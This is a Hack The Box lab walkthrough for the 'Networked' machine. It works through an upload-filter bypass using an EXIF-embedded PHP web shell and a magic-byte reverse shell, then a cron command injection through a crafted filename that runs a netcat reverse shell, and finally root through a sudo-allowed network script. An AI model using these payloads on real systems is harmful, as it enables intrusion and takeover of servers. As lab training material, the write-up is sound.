---
layout: walkthrough
title: Networked
description: HTB walkthrough
logo: /assets/img/walkthroughs/networked_logo.png
show-avatar: false
permalink: /walkthroughs/networked.html
OS: Linux
difficulty: Easy
release: 24 Aug 2019
creator: <a href="https://www.hackthebox.eu/home/users/profile/8292">guly</a>
cleared: 1 Nov 2019
published: 2019 11 01
---

<h2 align="center">Enumeration</h2>
Starting with standard nmap scan...

```s
# Nmap 7.80 scan initiated Thu Oct 31 14:15:09 2019 as: nmap -sC -sV -p- -oN nmapscan.txt 10.10.10.146
Nmap scan report for 10.10.10.146
Host is up (0.098s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 31 14:18:04 2019 -- 1 IP address (1 host up) scanned in 175.03 seconds

```

Seeing port 80, we navigate to the webpage and see nothing of interest, however checking the page source shows us an interesting comment

```html
<html>
<body>
Hello mate, we're building the new FaceMash!</br>
Help by funding us and be the new Tyler&Cameron!</br>
Join us at the pool party this Sat to get a glimpse
<!-- upload and gallery not yet linked -->
</body>
</html>
```

So we know there is more to find. However we should be directory busting anyway, so this doesn't offer much.

Running 

```sh
gobuster dir -w <wordlist> -x .php,.txt -o <outputfile> -u http://10.10.10.146
```

with the appropriate wordlist yielded the following results

```sh
/uploads (Status: 301)
/photos.php (Status: 200)
/index.php (Status: 200)
/upload.php (Status: 200)
/lib.php (Status: 200)
/backup (Status: 301)

```

If we navigate to /backup we see

![backup](/assets/img/walkthroughs/networked_backup_page.png)

Downloading and extracting the tar file we find its the source files for the .php pages we found. 


![Source](/assets/img/walkthroughs/networked_source_files.png)

Analyzing the upload.php and lib.php files we see that there is some extension checking in place, as well as a mimetype check. These are in place to attempt to only allow us to upload an image file. There are two ways I found to bypass this.


<h3 align="center">Initial foothold</h3>
**Method 1:**



We can modify the exif data of an image to give us code execution using **exiftool** as follows

```sh
exiftool -DocumentName="<?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?>" hilbert.jpg 

```

then we rename the image file to hilbert.php.jpg and upload it and navigate to the image and check if we have code execution

![RCE](/assets/img/walkthroughs/networked_exifdata_torce.png)

Bingo! We can now use wget to download a shell file to the server and then navigate to it to get a reverse shell.

**Method 2:**

This method is much easier. We simply take our favorite php reverse shell (I'm using one from pentestmonkey) and append 'magicbytes' to the start of the file. This makes the mimetype check php is using think it is an image file. 

![magicbytes](/assets/img/walkthroughs/networked_magicbytes.png)

Again we rename the file with the extension .php.jpg and upload it. Then set up a netcat listener on whatever port you edited into the reverse shell, and navigate to the image file

![reverseurl](/assets/img/walkthroughs/networked_reverse_url.png)

```sh
root@kali:~/HTB/Boxes/Networked# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.146] 47636
Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 21:52:12 up  3:22,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ whoami
whoami
apache

```



<h3 align="center">Privilage Escalation</h3>
We have a shell but we are only user apache. Looking at the /etc/passwd file we see there is user named "guly". If we look in /home/guly we see two interesting files. 'crontab.guly' and 'check_attack.php'. Looking at the files we see that crontab.guly is set to run check_attack.php every 3 minutes. If we look at check_attack.php

```php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>

```



We see that it basically looks at all the files in the uploads folder that we previously placed our disguised image file in, and deletes files that don't belong. If we look closely at the code, this line in particular stands out

```php
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```

The value variable holds the name of a file and we can name it in such a way to execute code!

As user apache we have write access in that directory, so all we need to do is go to the directory and create the appropriate named file.

```sh
sh-4.2$ cd /var/www/html/uploads
sh-4.2$ touch ";nc 10.10.14.3 1235 -c bash"

```

Then we simply have to listen on the appropriate port and wait for the program to run and then...

```sh
root@kali:~/HTB/Boxes/Networked# nc -nlvp 1235
listening on [any] 1235 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.146] 57202
whoami
guly

```

Bingo! We can now cat the user.txt file.

<h3 align="center">On To Root</h3>
Running "sudo -l" we see

```sh
User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh

```

So we can run this changename.sh file as root without a password.

A bit of googling turns up this vulnerability

https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f

which tells us that due to some improper handling anything after an inputted space for the name field when running the script will be executed. So we can simply enter "bash" after the space like so

```sh
[guly@networked sbin]$ sudo ./changename.sh
interface NAME:
hilbert bash
interface PROXY_METHOD:
blah
interface BROWSER_ONLY:
blah
interface BOOTPROTO:
blah 
[root@networked network-scripts]# whoami
root

```

We now have access to the root flag.
